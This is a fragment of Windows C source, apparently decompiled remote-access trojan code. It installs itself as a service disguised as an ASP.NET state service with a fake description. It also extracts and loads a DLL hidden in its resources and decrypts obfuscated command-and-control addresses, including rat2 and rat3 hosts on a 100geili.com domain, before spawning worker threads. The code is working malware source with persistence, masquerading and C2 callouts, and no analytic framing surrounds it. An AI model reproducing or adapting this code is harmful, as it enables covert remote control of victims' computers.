	hServiceStatus = RegisterServiceCtrlHandlerA("aspnet_statesjrq", (LPHANDLER_FUNCTION)HandlerProc);// aspnet_statesjrq

	ServiceStatus.dwServiceType = 32;
	ServiceStatus.dwControlsAccepted = 7;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwWaitHint = 2000;
	ServiceStatus.dwCheckPoint = 1;
	ServiceStatus.dwCurrentState = 2;
	SetServiceStatus(hServiceStatus, &ServiceStatus);
	ServiceStatus.dwCheckPoint = 0;
	Sleep(0x1F4u);
	ServiceStatus.dwCurrentState = 4;
	SetServiceStatus(hServiceStatus, &ServiceStatus);
	CreateMutexA(0, 0, "aspnet_statesjrq");       // aspnet_statesjrq
	if ( GetLastError() == 183 )
		ExitProcess(0);

	EnumResNameProc(GetModuleHandle(NULL),"dll",MAKEINTRESOURCEA(IDR_DLL1),0);

	DWORD errir = GetLastError();
	Sleep(100);

	wsprintfA(v3, "gei%u.dll", 33);
	hebingwenjian_sub_402A70((LPCSTR)v3);
	loadlibrary_sub_401320();

	strcpy(IP1,"I=0E>>0H=0E=><EFFF");
	Decryp_sub_402850(IP1, strlen(IP1), 10);// 58.188.69.198:1000

	char /*temp1[32],temp2[32],temp3[32],temp4[32],temp5[32],temp6[32],temp7[32],*/temp8[32],temp9[32];
	// 	sprintf(temp1, "%s%s", "pm.coq:<444", "rex2.544gim");
	// 	strrev(temp1); //mig445.2xer444<:qoc.mp
	// 	
	// 	sprintf(temp2, "%s%s", "rm0coq<>666", "tez40566gim");
	// 	strrev(temp2);//mig66504zet666><qoc0mr
	// 
	// 	sprintf(temp3, "%s%s", "lq.komB@888", "zit:.988geq");
	// 	strrev(temp3);//qeg889.:tiz888@Bmok.ql
	// 
	// 	sprintf(temp4, "%s%s", "eqnq0komDB:::", "|iv<09::g");
	// 	strrev(temp4);//g::90<vi|:::BDmok0qnqe
	// 
	// 	sprintf(temp5, "%s%s", "upu.koqBD<<<", "|mz<0=>>gi");
	// 	strrev(temp5);//ig>>=0<zm|<<<DBqok.upu
	// 
	// 	sprintf(temp6, "%s%s", "uru0koqDF>>>", "ok.upu");
	// 	strrev(temp6);//upu.ko>>>FDqok0uru
	// 
	// 	sprintf(temp7, "%s%s", "li.som:8@@@", "俼凚.A@@wui");
	// 	strrev(temp7);//iuw@@A.B剄侤@@8:mos.il

	sprintf(temp8, "%s%s", "666><qoc0mrm", "ig66504zet");
	strrev(temp8);//tez40566gimrm0coq<>666

	sprintf(temp9, "%s%s", "888ABmok.q", "lqeg889.;tiz");
	strrev(temp9);//zit;.988geqlq.komBA888

	Decryp_sub_402850(temp8, strlen(temp8), 2);// rat2.100geili.com:8000
	strcpy(IP2,temp8);
	Decryp_sub_402850(temp9, strlen(temp9), 3);// rat3.100geili.com:9000
	strcpy(IP3,temp9);

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread1, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread2, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread3, 0, 0, 0);
	while ( 1 )
		Sleep(0x1388u);
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	BOOL v4; // eax@1
	srand( (unsigned)time( NULL ) );
	
	// aspnet_statesjrq
	SERVICE_TABLE_ENTRYA ServiceStartTable[] = {
		{"aspnet_statesjrq",(LPSERVICE_MAIN_FUNCTIONA)ServiceMain},{NULL,NULL}
	};
	DWORD error;
	v4 = OpenKey_();
	if ( v4 )
	{
		BOOL flag = StartServiceCtrlDispatcherA(ServiceStartTable);
		if (!flag)
		{
			error = GetLastError();
		}
	}
	else
	{
		My_CreateServer(
			"aspnet_statesjrq",
			"ASP.NET State Servicesyta Transaction Coordinator Service",
			"Provides support for out-of-to-processmid Transaction Coordinator Service.");

		if ( flag )
		{
			COPYTOSOFTWARE_LOG_sub_402880();
			//exit(0);
		}
	}
	return 0;
}

